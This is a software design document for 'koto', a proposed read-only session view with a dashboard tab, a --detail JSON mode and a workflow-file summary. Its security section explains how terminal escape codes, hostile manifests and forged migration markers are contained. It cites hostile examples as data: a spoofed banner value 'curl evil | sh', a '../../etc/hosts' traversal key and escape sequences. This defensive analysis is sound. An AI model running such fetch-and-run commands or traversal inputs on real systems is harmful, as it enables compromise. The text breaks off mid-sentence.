---
schema: design/v1
status: Proposed
problem: |
  No shipped surface shows a person what a session holds. The dashboard has
  no ContextStore access and reads state files by path, bypassing migration
  awareness; the directive derivation is trapped in handle_status, which
  exits the process; a cloud content read pulls objects and appends events;
  and three contracts (feed columns, workflow-file fields, the verb set) are
  frozen against breaking change.
decision: |
  One data layer, three presentations: a library-callable session snapshot
  (facts, directive, per-key metadata) extracted from handle_status, plus a
  bounded, pull-free, sanitizing content reader; a new Session tab in the
  dashboard TUI with an off-tick loader; a --detail JSON mode on the existing
  dashboard invocation; and a holdings object in the workflow file's koto
  block at contract v3, derived from the log pass it already makes.
rationale: |
  The concrete Backend is the one handle that reaches both ContextStore and
  check_not_migrated, so a migrated session is answered by name instead of
  rendering holes; bounded local-only reads keep the view provably read-only
  on cloud sessions (no pulls, no events) at a fixed metadata cost; and every
  surface change is additive — a new tab, a new flag, a versioned extension
  block — so the frozen contracts keep their shape.
upstream: docs/prds/PRD-session-view.md
---

# DESIGN: A human-readable view of a session

## Status

Proposed

## Context and Problem Statement

A session's working state is spread across stores the shipped surfaces never
join up for a reader. The context store holds every key's bytes, with a
manifest (`ctx/manifest.json`) that already records each key's size, SHA-256,
writer and creation time. The state log holds the header (identity, intent,
`execution_dir`, `origin{anchor, store}`) and the events the current state is
derived from. The compiled template holds the directive text `handle_status`
interpolates. The dashboard (`src/cli/dashboard*.rs`) renders a multi-session
list and a per-session detail pane (Summary, History, Remaining) from state
files it reads by path, never touching the context store; its one-shot mode
prints a fixed 8-column feed. The workflow view (`src/workflows_surface/`)
projects each session into a `koto-<uuid>.json` status file on every commit.

The PRD asks these surfaces to answer "what does this session hold?" for a
person: every manifest key with size, writer and legible content (text
excerpted to a bound with a visible truncation marker; binary — invalid UTF-8
in a sampled prefix, or NUL — shown as type, size and hash); the session facts
(name, id, intent, template, state, directive, anchor, store origin) with
explicit absent markers; plain statements for unreadable keys and for migrated
sessions (naming the successor and workspace); all of it read-only, bounded in
output, with a fixed remote-request count for metadata on cloud sessions, with
the existing feed columns and workflow-file fields untouched, and with no new
top-level verb or subcommand tree.

The technical problems that creates:

1. **Data access.** The dashboard is handed `&dyn SessionBackend` and reads
   state files by path, so it has neither `ContextStore` access nor migration
   awareness; `handle_status`'s directive interpolation is trapped in a
   function that exits the process on error. Reading content through the cloud
   backend's `get` pulls objects into the local store and appends events — a
   side effect a read-only view must handle deliberately.
2. **Placement.** The TUI detail pane, the one-shot mode and the workflow file
   each have an existing shape (tabs; a positional column contract; a
   version-numbered JSON contract with a shape-guard fixture) that the view
   must extend without breaking.
3. **Legibility.** koto has cut-and-flag precedents (`redact::safe_cut_len`,
   capture truncation flags, the workflow view's 240-character preview) but no
   size formatter, no binary detection, and no control-character sanitizer
   beyond tab/newline/CR in the feed path.

## Decision Drivers

- **Completeness without blocking.** Every manifest key renders (PRD R2), and
  the TUI stays responsive under its 500ms refresh while content loads
  (R6) — so the data path must separate cheap metadata from per-key content.
- **Read-only.** The view adds no writes and no per-key event spam (R10,
  AC11); the cloud `get` side effects force an explicit read policy (R9).
- **Bounded everything.** Output bounded per value and per invocation (R3,
  N1); metadata cost on cloud fixed regardless of key count — one manifest
  fetch and one migration check (N2).
- **Contract stability.** The feed's column positions (R7, AC4), the workflow
  file's existing fields (R8, AC7), and the top-level verb set (N4, AC9) are
  all frozen; every change is additive or behind a new flag.
- **Migration is an answer, not an error.** A migrated session renders its
  successor's name and workspace (R5, AC6), which requires the view to reach
  the backend's marker check rather than bypass it.
- **Terminal safety.** Arbitrary bytes reach a terminal only escaped (R3,
  AC10); the TUI's ratatui cell buffer protects one path, the one-shot
  stream has no protection today.
- **Maintainability.** The session-facts derivation should land where both
  surfaces and `handle_status` can share it, not as a third copy of state
  derivation.

## Considered Options

### Decision 1: The data-access path, loading model and cloud read policy

- **Chosen: the concrete backend, a shared snapshot, bounded local reads, no
  pulls.** `dashboard::run` takes the concrete `&Backend` (which implements
  `ContextStore` and carries `check_not_migrated`) instead of
  `&dyn SessionBackend`. A new library-callable session-snapshot function —
  the directive interpolation extracted from `handle_status`, returning
  errors instead of exiting the process — serves the dashboard, the one-shot
  mode and `handle_status` itself. Facts and per-key metadata load eagerly
  (one manifest read; on cloud, one cached manifest GET plus one
  migration-marker listing). Content loads per key as a bounded prefix read
  from the local store, through a new read-only accessor that never calls
  the syncing `get`. A key with no local copy renders from the merged
  manifest as size, hash and an explicit not-local state.
- **Rejected: eager `ContextStore::get` over all keys, accepting cloud
  pulls.** A cloud `get` downloads stale or missing keys, writes them into
  the local store and appends a `context_added` event per key
  (`src/session/sync.rs`), violating the read-only requirement and blocking
  the refresh loop.
- **Rejected: keep `&dyn SessionBackend` and read `ctx/manifest.json` and key
  files by path.** Bypasses `check_not_migrated`, so a migrated session
  renders holes instead of its successor; cannot merge the remote manifest;
  duplicates the store's key-to-path and manifest knowledge in the renderer.
- **Rejected: a second `&dyn ContextStore` parameter.** `check_not_migrated`
  is an inherent method on `Backend` (`src/session/mod.rs:585`), not on
  either trait, so the migration answer would still be unreachable, and both
  parameters would point at one object.

### Decision 2: Where the view lives in the TUI

- **Chosen: a new Session tab.** A fourth `DashboardTab`
  (`src/cli/dashboard_state.rs:19`) with its own scroll state and a lazy
  loader that runs off the render tick; Summary, History, Remaining and
  `read_detail` stay untouched. The key list gets a full-height scrollable
  surface, and anchor, origin, keys and the migration answer — none of which
  are in `read_detail`'s inputs — load through the new snapshot path.
- **Rejected: extend the Summary tab.** Summary already renders an unbounded
  directive with no scroll state; an unbounded key list underneath it makes
  both unreadable, and content reads would land in the synchronous render
  path.
- **Rejected: extend `DetailData`/`read_detail` with a new pane arrangement.**
  `read_detail` (`src/cli/dashboard_data.rs:655`) runs synchronously in the
  500ms tick, takes only a state-file path, and is guarded by the state-file
  mtime, so context reads would block the loop and miss context-only changes;
  a third column narrows the detail pane below usability at the 80-column
  floor.

### Decision 3: How the workflow-view file carries the summary

- **Chosen: a `holdings` object in the `koto` block, contract v3.** The
  summary — `keyCount`, `totalBytes`, a capped `keys` array of
  `{key, size}`, `keysTruncated`, `anchor`, `store` — lands inside the
  contract's declared extension block (`src/workflows_surface/contract.rs`),
  with `CONTRACT_VERSION` bumped 2 to 3 following the v1-to-v2 precedent and
  the shape-guard fixture updated. It is derived from the context events in
  the log read `derive_enriched_projection` already performs, so
  `materialize_after_commit` adds no I/O and no remote path.
- **Rejected: new top-level fields.** Risks colliding with the host reader's
  own vocabulary and blurs the existing-fields-unchanged boundary, with no
  display gain (the reader ignores unknown fields either way).
- **Rejected: additive within v2, no bump.** Two v2 shapes become
  indistinguishable and the shape guard loses its version anchor.
- **Rejected: encoding a summary into preview/detail strings.** Lossy,
  capped at 240 characters, alters fields today's screen renders, and cannot
  be asserted structurally.
- **Rejected: reading `ctx/manifest.json` per commit.** Adds a file read to
  every event append, and on cloud sessions implies manifest merging the
  render path must not do.

### Decision 4: The one-shot detail mode

- **Chosen: a boolean `--detail` flag on the existing invocation.**
  `--detail` requires the existing positional session name (clap
  `requires`), is checked before the `--once` and TUI branches so it can
  never fall into the TUI, and emits one JSON object: the session facts, a
  `keys` array with per-key metadata and bounded content rendering, and
  explicit absent/unreadable/not-local markers. Errors reuse the
  `handle_status` convention (`{error, command}`, exit 2 for a missing
  session, exit 3 for infrastructure). A migrated session is a successful
  exit-0 answer carrying a `migrated {target, workspace}` object and no
  `keys` field.
- **Rejected: `--detail <NAME>` as a value flag.** Leaves the positional
  dead and gives two ways to name a session.
- **Rejected: requiring `--once --detail`.** Ties a JSON mode to a flag
  documented as tab-separated output.
- **Rejected: making the positional with `--once` emit JSON.** Changes the
  output of existing invocations, breaking byte-compatibility.
- **Rejected: appending detail columns to the feed.** Scripts parse column
  positions, and content does not fit a row; the feed contract is frozen.

### Cross-validation

The four decisions compose with three reconciliations. The TUI uses Decision
2's off-tick loader as the mechanism and Decision 1's bounded prefix read as
the primitive; the one-shot mode reads eagerly and synchronously, since a
single bounded pass is its whole life. The workflow file derives holdings from
the log while the dashboard reads the manifest; the divergence is accepted for
a best-effort glance surface, and reserved keys (such as
`workflows/publish-location`) appear on both, because the requirement is every
manifest key. And the PRD's migrated-session wording was reconciled in place:
a migrated session is an answer (exit 0, successor named), not an error.

## Decision Outcome

One data layer, three presentations. A library-callable session snapshot
(facts, directive, per-key metadata) moves the derivation out of
`handle_status`; a bounded, pull-free content reader makes every rendering
terminal-safe; the dashboard gains a Session tab and a `--detail` JSON mode on
its existing invocation; the workflow file gains a `holdings` object in its
`koto` block at contract v3. Migration is checked first and answered by name.
Nothing new is written anywhere: no verb, no pulls, no events, no marker
touches.

The presentation constants, fixed here so every surface agrees:

- `EXCERPT_BOUND = 4096` bytes — the same figure as the session feed's
  secondary cut; excerpts cut at a character boundary
  (`redact::safe_cut_len`) with an explicit truncation marker.
- Binary classification samples `min(size, EXCERPT_BOUND)` leading bytes: a
  NUL byte or invalid UTF-8 in the sample (ignoring a trailing partial
  sequence at the cut) classifies the value as binary.
- Sizes render in binary units with one decimal (`512 B`, `4.0 KiB`,
  `1.2 MiB`), via one shared formatter.
- The workflow `holdings.keys` array caps at 50 entries with
  `keysTruncated: true` beyond it.
- One shared sanitizer in the snapshot layer runs on every untrusted string
  before either surface renders it, enforced by type: renderers accept a
  `Sanitized` newtype, so a missed field is a compile error. Its inputs are
  excerpts, key names, writers, facts, the migrated target/workspace,
  unreadable-reason and error-message text; the manifest `hash` is instead
  validated as 64 hex characters (anything else renders as a sanitized,
  capped `invalid-hash`) and `created_at` is parsed as a timestamp. It
  replaces C0 control characters (except newline and tab), DEL, the C1 range
  (including the 8-bit CSI U+009B), the bidirectional overrides and isolates
  (U+202A–U+202E, U+2066–U+2069), U+061C, zero-width and joiner characters
  (U+200B–U+200F, U+2060–U+2064, U+180E), the line and paragraph separators
  (U+2028, U+2029), soft hyphen, interlinear annotation (U+FFF9–U+FFFB), the
  BOM and the Unicode tag block (U+E0000–U+E007F) with a visible `\u{XXXX}`
  form; to keep the form unambiguous, a literal backslash immediately
  preceding `u{` is itself escaped. serde_json's own escaping (which covers
  only code points below U+0020) runs after it in the one-shot mode, and
  ratatui's control-character filter — which deletes silently rather than
  escaping — is a backstop in the TUI, not the mechanism. In one-line
  contexts (table cells, the banner) newline and tab fold to a space.

## Solution Architecture

### The snapshot layer (`src/session_view.rs`, new)

```
pub struct SessionViewSnapshot {
    pub facts: SessionFacts,            // name, session_id, created_at,
                                        // intent?, template_name?,
                                        // current_state, directive?,
                                        // execution_dir?, origin?         (absent fields stay None)
    pub migrated: Option<MigratedTo>,   // target, workspace
    pub keys: Vec<KeyEntry>,            // key, size, writer?, created_at,
                                        // locality: Local|RemoteOnly,
                                        // stale: bool
}
pub enum SnapshotError { NotFound, Corrupt(..), Infrastructure(..) }
    // Migrated is NOT an error: it comes back as `migrated: Some(..)`.
    // `handle_status` maps the variants to its existing exit codes and
    // translates `migrated: Some` back to its current exit-2 behavior;
    // `--detail` maps NotFound to exit 2, Corrupt/Infrastructure to exit 3,
    // and `migrated: Some` to the exit-0 answer.
pub fn snapshot(backend: &Backend, name: &str)
    -> Result<SessionViewSnapshot, SnapshotError>
pub fn read_key_preview(backend: &Backend, name: &str, key: &str, bound: usize)
    -> KeyPreview                       // Text{excerpt, truncated} |
                                        // Binary{size, hash}   (both RECORDED
                                        //   from the manifest, never computed:
                                        //   hashing is a full read) |
                                        // Unreadable{reason} | NotLocal{size, hash} |
                                        // InvalidName
```

`snapshot` calls `Backend::check_not_migrated` first: a `SessionMigrated`
answer fills `migrated` and returns early with facts only. Otherwise it reads
the header and events once (`read_events`), derives state
(`derive_machine_state`), and interpolates the directive through a
directive-rendering helper extracted from `handle_status`. The split is
deliberate and the trade is acknowledged: `handle_status` keeps its own
template pass and its extra outputs (template path and hash, `is_terminal`,
the hash-mismatch report, `details`, `expects`) and calls the same helper for
the directive, so its JSON and exit codes stay byte-identical under existing
tests, while the snapshot stays lean; sharing the whole snapshot was the
higher-risk refactor and the helper is what removes the duplicated logic.
Keys come from `ContextStore::list_keys` + `meta`, validating each name with
`validate_context_key` as it lists — `list_keys` (local and remote) performs
no validation of its own, so a hostile manifest can put anything in the list.
A name that fails validation still appears, keeping the listing complete, but
as an `invalid-name` entry: sanitized, capped at 256 characters with a cut
marker, never joined to a path, never read; a `meta` returning `None` for
such a key keeps the entry rather than dropping it. Localities and `stale`
come from a new inherent `Backend::manifest_pair(name)` returning the local
manifest and, on the cloud backend, the remote one from the cached fetch the
backend already performs (the local backend returns `None`); `stale` is set
when the two hashes for a key differ, at no extra request. Metadata entries
are themselves bounded: past `METADATA_CEILING = 100_000` keys the snapshot
stops listing and records how many more exist, a visible, documented
exception to R2's completeness that trades an unbounded listing for an
explicit "N more not listed" count.

`read_key_preview` reads the local file with a bounded prefix read through a
new read-only inherent accessor, `Backend::read_context_prefix(name, key,
bound)`, which delegates to the local store and joins the path through
`content_path` after `validate_context_key` — never from a manifest string.
Hardening order matters: the accessor `lstat`s the path first and rejects
anything but a regular file (an `open` on a FIFO blocks before any
handle check could run), then opens with `O_NONBLOCK | O_NOFOLLOW`, then
`fstat`s the handle to close the check-to-open race, and reads via
`Read::take(bound)`, never `fs::read`. `O_NOFOLLOW` guards only the final
component, so the accessor also verifies the canonicalized parent stays under
the session's `ctx/` root before opening, covering a symlinked intermediate
directory planted by something other than koto. On non-Unix targets, where
`O_NOFOLLOW` is unavailable, the lstat rejection and the canonicalized-parent
check carry the guarantee alone. It classifies text/binary on the bytes
actually read — not the manifest's claimed size — and formats nothing;
formatting belongs to the surfaces.

### The dashboard (`src/cli/dashboard*.rs`)

`dashboard::run` and `run_once` take `&Backend`. A fourth
`DashboardTab::Session` renders the snapshot: a facts block (absent fields
printed as `—` with the field name), the migration banner when `migrated` is
set, then the key table (name, size, writer, locality/stale) with the focused
key's preview beneath it. The banner renders the marker's strings — which an
arbitrary bucket writer controls, unbounded and unvalidated
(`marker_target_field`) — sanitized, each capped at 128 characters with a cut
marker, quoted inside the fixed wording `migrated to session "…" in workspace
"…"`, never phrased as an instruction, and never followed, resolved or passed
to any path or command. Because the sanitizer's escape set does not include
the quote character, banner values additionally escape `"` and `\`
(Rust-debug-style quoting), so a value like `x" in workspace "trusted` cannot
forge the fixed wording. The excerpt pane renders every content line behind a
fixed gutter prefix, so a text value cannot impersonate the facts block, the
banner or a table row.

There is no worker thread in v1. The Session tab loads lazily on the existing
tick: the snapshot (facts plus metadata — cheap, one manifest read) loads on
tab entry and is invalidated by the state-file mtime the data layer already
tracks, and one bounded 4 KiB preview read runs per focused key, cached per
mtime generation. Preview reads are local-file prefix reads, the same
synchronous exposure `read_detail` already has; a hung network filesystem
stalls the tick either way, and that inherited, unwidened exposure is
documented rather than papered over with a thread. The tab cycle in
`dashboard_state.rs` grows to four tabs (its tests update accordingly), and
the key table is virtualized — rows are built for what is drawn, so a huge
manifest costs rows drawn, not rows built. The other three tabs and
`read_detail` are untouched.

`--detail` (requires the positional name; declared `conflicts_with` `--once`,
`--status`, `--needs-you`, `--all` and `--interval`, so the feed and TUI
modes cannot be mixed in) branches before `--once` and the TUI: it checks the
session exists itself — the positional is a silent filter in the feed today,
so the detail mode does not inherit that behavior — then builds the snapshot,
eagerly reads key previews, serializes one JSON object (facts; `migrated` or
`keys` in the same lexicographic order the snapshot lists; per-key
`{key, size, writer, created_at, locality, stale, content}` where `content`
is the typed preview), and exits 0 — or `{error, command: "dashboard"}` with
exit 2 (missing session) / exit 3 (infrastructure) on the `handle_status`
convention, which requires making the exit-code helpers in `src/cli/mod.rs`
reachable from the dashboard module. The schema is owned and documented by
`docs/reference/session-feed.md`. Previews are read for at most
`DETAIL_PREVIEW_CEILING = 1000` keys; past the ceiling, keys appear with
metadata only and `contentOmitted: "key-limit"`, and the top level counts the
omissions — so the listing stays complete while output stays bounded. The
documented worst case is honest about escaping: a sanitized excerpt can
expand each byte into a six-character escape whose backslash serde_json then
doubles, so a key's rendered content is bounded by roughly seven times the
4096-byte source bound (about 28 KiB per key). The existing feed path is not
edited: `--once` without `--detail` runs exactly today's code.

### The workflow file (`src/workflows_surface/`)

`contract.rs` gains `holdings` inside the `koto` block and bumps
`CONTRACT_VERSION` to 3; `project.rs` folds `context_added` /
`context_removed` (and anchor events) from the log pass it already makes into
`{keyCount, totalBytes, keys: [{key, size}] (≤50), keysTruncated, anchor,
store}`. The fold is last-writer-wins per key, since a key can be re-added or
removed across the log. Each name passes `loggable_key` before inclusion (a
pulled state file can carry event keys that never passed validation; an
invalid name is counted in `keyCount` and `totalBytes` but omitted from
`keys`), `anchor` and `store` pass the shared sanitizer and a length cap
before the fold writes them (JSON escaping alone leaves DEL, C1, bidi and
zero-width characters through, the same gap the `--detail` path closes), and
`totalBytes` sums with saturating addition so a forged `u64::MAX` size cannot
overflow it. The reference page documents plainly that key names are written
to this file — an accepted exposure, since the hosting directory already
holds the session transcript — and that content and hashes never are. The three version pins (two in `contract.rs` tests, one in
`tests/native_workflows_shape.rs`) and the golden fixture
`tests/fixtures/native-workflows/enriched-shape.json` move to v3 with a
populated `holdings`.

### Documentation

`docs/reference/session-feed.md` documents `--detail` and its JSON schema
beside the feed columns it leaves untouched; the dashboard guide gains the
Session tab; the koto-user skill's command reference gains `--detail` and the
migrated-session answer (per the repository's skill-maintenance rule).

## Implementation Approach

Five pieces; the riskiest refactor ships alone, and the last can run in
parallel with everything after the first:

1. **Snapshot module, unused.** `session_view.rs` with `SnapshotError`,
   `snapshot`, `read_key_preview`, the `Sanitized` newtype, the
   excerpt/binary/size helpers, and the backend accessors
   (`read_context_prefix`, `manifest_pair`). Nothing calls it yet. Unit
   tests: absent fields, migrated answer, binary/text classification edges,
   boundary-safe cuts, invalid names and hashes, stale flag, sanitizer
   classes, FIFO/symlink rejection, no writes (store byte-identical, event
   count fixed).
2. **`handle_status` onto the directive helper.** The extraction with JSON
   and exit codes byte-identical under the existing tests — the riskiest
   step, shipped on its own so a regression is unmistakable.
3. **One-shot `--detail` and docs.** The `&Backend` widening of
   `dashboard::run`/`run_once`; the `--detail` mode with its clap conflicts,
   existence check and error convention; feed byte-compatibility test
   (golden rows) and `--detail` golden output against the carrier-key
   fixtures (several sizes, one binary, one long); `session-feed.md` and the
   koto-user skill updates.
4. **The Session tab.** The fourth tab, its on-tick loader, scroll,
   gutter-rendered excerpts, banner; dashboard-state test updates; the
   dashboard guide.
5. **Workflow holdings.** Contract v3, projection fold (last-writer-wins,
   `loggable_key`, sanitized anchor/store, saturating sums), fixture and pin
   updates; a materialize test asserting no content bytes and no remote
   calls. Independent of 2-4.

## Security Considerations

The view is a reader of data koto did not author. Context content is whatever an agent or a person submitted; on a cloud-backed session the manifest, the state log and the migration marker come from a bucket that anyone with write access can edit. The view treats every one of those as untrusted text headed for a terminal, a pipe or a file in another tool's directory. It adds no network listener, no credential handling, no new write path and no new verb. Its exposure comes from rendering, reading and summarizing.

**Terminal output of untrusted content.** Two protections exist today and both are real, but neither covers the whole problem. In the TUI, ratatui 0.29 writes strings through `Buffer::set_stringn`, which drops every grapheme containing a `char::is_control` character before it reaches the cell buffer (`ratatui-0.29.0/src/buffer/buffer.rs:346`). That covers C0, DEL and C1 on the verified path: strings rendered through `set_stringn` (`Line`, `Span`, `Table` cells, non-wrapping `Paragraph`). The wrapped-`Paragraph` reflow path and direct `Cell::set_symbol` writes were not verified and may bypass the filter, so the TUI escape test renders through the actual wrapped excerpt widget and asserts on the `Buffer` cells. The claim in DESIGN-local-dashboard.md ("it does not interpret escape sequences in content strings") is accurate for that reason, but the mechanism is silent deletion, not escaping: an excerpt holding `\x1b[2J` would render as the printable tail `[2J` with no sign anything was removed. The view therefore does not lean on ratatui for legibility, only as a backstop.

In `--detail`, serde_json escapes `"`, `\` and code points below U+0020 (ESC becomes `\u001b`), so the C0 set cannot reach the stream raw. It does not escape DEL (U+007F), the C1 range (U+0080 to U+009F, where U+009B is an 8-bit CSI that some terminals honor even in UTF-8 mode), or the invisible formatting characters that spoof text: bidirectional overrides and isolates (U+202A to U+202E, U+2066 to U+2069), zero-width characters (U+200B to U+200F) and the byte-order mark (U+FEFF). A user who runs `koto dashboard --detail <name>` with the output going to a terminal, or who pipes it through `jq -r`, would print those raw. AC10 names ESC, which serde_json already handles, so the acceptance criterion would pass while the C1 and bidi gap stayed open.

The design closes this with one shared sanitizer in `session_view.rs`, applied to every untrusted string before either surface sees it and enforced by a `Sanitized` newtype that renderers require, so a missed field is a compile error rather than a test gap. Its inputs are excerpt text, key names, `writer`, the facts, the migrated `target` and `workspace` strings, unreadable-reason text and error messages; the manifest `hash` is validated as 64 hex characters (else rendered as a sanitized, capped `invalid-hash`) and `created_at` is parsed as a timestamp rather than echoed. It replaces C0 other than newline and tab, DEL, C1, the bidi overrides and isolates, U+061C, the zero-width and joiner set (U+200B–U+200F, U+2060–U+2064, U+180E), U+2028/U+2029, soft hyphen, U+FFF9–U+FFFB, the BOM and the Unicode tag block (U+E0000–U+E007F) with a visible `\u{XXXX}` form, and escapes a literal backslash preceding `u{` so the form is unambiguous. The JSON mode runs it first and lets serde_json escape the quotes and backslashes afterward; the TUI runs it first and treats ratatui's filter as a second layer. Tabs and newlines in an excerpt stay, because the TUI lays them out and JSON escapes them, but in table cells and the banner, where one line is expected, they fold to a space the way `sanitize_field` in `src/cli/dashboard.rs` does for the feed. `sanitize_field` itself only handles tab, newline and CR, so it is not reused for this; the feed's contract is unchanged and its function stays as it is. A test feeds a value holding ESC, CSI, OSC, U+009B, DEL, U+202E and U+200B through both surfaces and asserts that no byte or code point from those classes appears in the output.

Binary values are never excerpted, which removes the largest class of terminal-hostile content. The classification samples `min(size, EXCERPT_BOUND)` bytes, so a file that is text for 4096 bytes and hostile after that is shown as text, and the excerpt stops at the bound anyway. The reported size, however, comes from the manifest, and the sample comes from the file; the classifier must use the number of bytes actually read, not the manifest's claim, and the rendering says "recorded" for the hash and size it takes from the manifest.

**Key names and facts fields.** Key names are not trustworthy even though the store validates them on write. `LocalBackend::list_keys` returns the manifest's keys without calling `validate_context_key`; `meta` and `get` do call it. On a cloud session `remote_list_keys` merges the remote manifest's keys the same way, with no validation. A hostile manifest can therefore put a key such as `../../etc/hosts`, a name with ESC in it, or a 10 MB string into the list. The snapshot validates each key with `validate_context_key` as it lists. A key that fails is still shown, so the listing stays complete (R2), but as an entry with a sanitized, length-capped name (256 characters, with a marker when cut), the state `invalid-name`, the manifest's recorded size, and no read attempted. Key names that do pass validation contain only `[A-Za-z0-9._/-]`, so they need no escaping, but the sanitizer runs on them regardless: the cost is nothing and the invariant becomes "no manifest string reaches output unsanitized". The same holds for the facts: `intent`, `template_name`, `execution_dir`, `origin.anchor` and `origin.store` come from the state-log header, which a pulled session file takes from the bucket. They go through the sanitizer and a length cap before the TUI draws them or the JSON carries them. `intent` is free text from whoever started the session and is already shown by the dashboard; the Session tab adds no new reader for it, but it is capped here.

**Bucket-sourced strings in the migration banner.** The migration design says marker fields reach output only inside JSON-encoded strings. That holds for `koto session` output and for `--detail`, where the `migrated {target, workspace}` object is JSON. The Session tab is a new surface that draws those strings as plain text in a banner, so the JSON guarantee does not transfer. `marker_target_field` in `src/session/cloud.rs` reads `target.session` and `target.workspace` with `as_str()` and no validation, no length bound and no character restriction, so a marker writer controls their content completely. Two things follow. First, the banner is a spoofing surface: a marker can name a "successor" with a name like `ok -- run: curl evil | sh` or a workspace path styled to look like a trusted one, and a person reading the banner may act on it. Second, a long or control-laden string can wreck the layout. The design handles both. The banner runs the values through the sanitizer, additionally escapes `"` and `\` (the sanitizer's set does not include the quote, and an embedded quote could otherwise forge the fixed wording), caps each at 128 characters with a cut marker, and renders them as quoted values after a fixed label ("migrated to session "..." in workspace "...""), never as an imperative sentence or a suggested command. It does not hyperlink, resolve or open either string, and neither is passed to any path or command; the view never follows the successor. For the same reason it tells the reader nothing about whether the target exists or can be trusted. A forged marker already lets a bucket writer make a session refuse (the migration design accepts this as denial of service by someone who could delete the session), and the view adds only the misleading-text risk, which the quoting and caps contain. A marker that cannot be parsed reads as `unknown` for both fields today and the banner shows that as-is.

**What the workflow file leaks.** The `holdings` object is written to `koto-<uuid>.json` under the hosting Claude Code session's directory in `~/.claude/projects`, which is the same place and the same trust domain as the transcript for that session. It carries key names, sizes, the key count, the total, the anchor path and the store kind. It never carries content, hashes or writers. Key names can be sensitive: `customers/acme-acquisition-terms.md` tells a reader something even without the body. That exposure is accepted for these reasons. The file lives in a directory koto does not create, owned by the same user who owns the session store, and that directory already holds the full transcript, which includes every tool result and file the agent read, so any reader of the holdings can already read far more. The key names are already written to the state log's `context_added` events (the source for the fold), which sits in the session directory with the same user ownership. The summary exists so that someone can see what a session holds without opening it, and omitting names would defeat that. Content, and the hash that would let a reader confirm a guess about content, stay out because they would turn a metadata file into a data file and give an unrelated reader a way to test hypotheses. The anchor path can reveal usernames and project names and is accepted on the same ground as `execution_dir`, which the existing file already carries. Documentation says plainly that key names are written to this file, and `keys` caps at 50 so a session with thousands of keys cannot make the file large. The fold applies `loggable_key` to each name before it is included, because a pulled state file can hold event keys that never passed validation; an invalid name is counted in `keyCount` and `totalBytes` but omitted from `keys`. Sizes are summed with saturating addition so a state log carrying `u64::MAX` cannot overflow the total. The file is JSON, so name characters are escaped by serde_json; the key-name grammar is what makes names safe verbatim, while `anchor` and `store` — which no grammar constrains — pass the shared sanitizer and a length cap before the fold writes them, since JSON escaping alone leaves DEL, C1, bidi and zero-width characters for the host application to render. How the host displays the file is its own concern, flagged to its maintainers rather than assumed safe.

**Resource exhaustion.** Content reads are bounded by construction. The accessor `lstat`s the path first and rejects anything but a regular file — an `open` on a FIFO blocks before any handle check could run, so the check must precede the open — then opens with `O_NONBLOCK | O_NOFOLLOW`, `fstat`s the handle to close the check-to-open race, takes at most `EXCERPT_BOUND` bytes (4096) with `Read::take`, and never calls `fs::read`. `O_NOFOLLOW` guards only the final path component, so the accessor also verifies the canonicalized parent stays under the session's `ctx/` root, covering a symlinked intermediate directory; on non-Unix targets, where `O_NOFOLLOW` is unavailable, the lstat rejection and the parent check carry the guarantee alone. This defends the case where something other than koto writes into the user's session directory. The binary hash and size shown come from the manifest. The view does not hash content, because hashing is a full read and would break the bound; the output labels them as recorded, not verified.

Output size is bounded as the PRD requires: the one-shot JSON is at most keys times (4096-byte excerpt plus a fixed per-key overhead) plus facts. The sanitizer can expand a byte into a six-character escape whose backslash serde_json then doubles, so the worst case is about 7 times the bound per key after escaping; the design states the 4096-byte bound as applying to the source excerpt and documents the escaped size as up to roughly 28 KiB per key. The one-shot mode reads every key eagerly, so a manifest naming 100,000 keys would produce on the order of gigabytes of output and read 100,000 files. That requires a manifest-writer, and the output is still bounded by key count, but the design adds a hard ceiling: `--detail` reads and emits previews for at most 1,000 keys (a named constant), lists the rest by metadata only with `contentOmitted: "key-limit"` on each, and states the count of omitted previews at the top level. Metadata is itself bounded by `METADATA_CEILING` (100,000 entries, with a visible "N more not listed" count — a documented, deliberate exception to the complete listing for stores no honest session produces). The TUI never faces the preview problem, since it reads one preview per focused key; it virtualizes the table so a huge manifest costs rows drawn, not rows built, and the key list scroll does not allocate a widget per key.

Manifest numbers are untrusted too. `size` is a `u64` and can be anything. The size formatter handles the full range with floating-point or saturating division and never indexes a unit table past the last entry; `0 B` and `u64::MAX` are both fixture cases. The remote manifest is fetched whole by `fetch_remote_manifest`, which has no body limit today; the view does not widen that, since it uses the cached fetch the backend already performs and adds no request (N2), but a bucket writer can hand any koto command a huge manifest and the view inherits that existing exposure, tracked as a follow-up rather than widened or fixed here. There is no loader thread: the TUI reads one bounded preview for the focused key per tick, cached per mtime generation, so rapid scrolling cannot queue unbounded reads, and a read that hangs (a network filesystem) stalls the tick exactly as `read_detail`'s synchronous state-file reads already can — an inherited exposure the design documents rather than papers over.

**Read-only guarantees and what enforces each.** No pulls: the preview path calls a new accessor on the local store that composes the path through the store's own `content_path` after `validate_context_key` and reads the file; it never calls `ContextStore::get`, whose cloud implementation downloads, writes the local file and appends a `context_added` event. The enforcement is structural, since the accessor lives on the local half of the backend and has no handle to the bucket, and a test runs the cloud fixture with a mock S3 that fails the test on any GET of a `ctx/` object and on any PUT or DELETE at all. No events: the snapshot reads the log with `read_events`, which does not append, and a test asserts the event count and the file bytes are identical before and after a render and a `--detail` run (AC11). No marker writes: the only marker access is `check_not_migrated`, which lists and at most fetches `migrated.json` and caches the answer in memory; the view never calls the import, the cleanup or the retry paths that write or delete markers (`is_migration_marker` guards that code in `cloud.rs`). The session snapshot function takes `&Backend` and uses only read methods, and the dashboard receives no write-capable handle other than the one it already had. One honest caveat: `check_not_migrated` and the manifest fetch are network reads, and the manifest cache is mutated in memory; those are existing read-path effects that R10 allows and N2 bounds at two requests.

The migration check runs first, so a migrated session never has its keys read. Its answer is cached per process; the Consequences section already notes the staleness. That is a correctness trade, not a security one, because a stale "not migrated" shows the old session's local keys read-only, which is what the local user already has on disk.

**Path safety.** Every path the view reads is built from either the session name or a key, and both pass validation. The session name arrives as `ValidatedSessionId`. The key goes through `validate_context_key` (components of `[A-Za-z0-9][A-Za-z0-9._-]*`, no `.` or `..` components, no leading, trailing or doubled slash, at most 255 bytes) before the accessor builds `ctx/<key>`; a key that fails is never joined to a path, which is what the invalid-name entry above guarantees. The accessor is a method on the store that joins through `content_path` after validating, so the renderer has no code that composes a path from a manifest string. The design forbids the alternative it rejected in Decision 1 (reading `ctx/manifest.json` and key files by path from `dashboard*.rs`) partly on these grounds, and the implementation keeps `dashboard*.rs` free of `Path::join` on manifest strings; a grep-style test in the module enforces that. On cloud sessions the S3 object key for a listing is `<prefix>/<id>/...` built by the existing backend functions with validated components, and the view adds none.

**Untrusted text reaching agent readers.** `--detail` emits
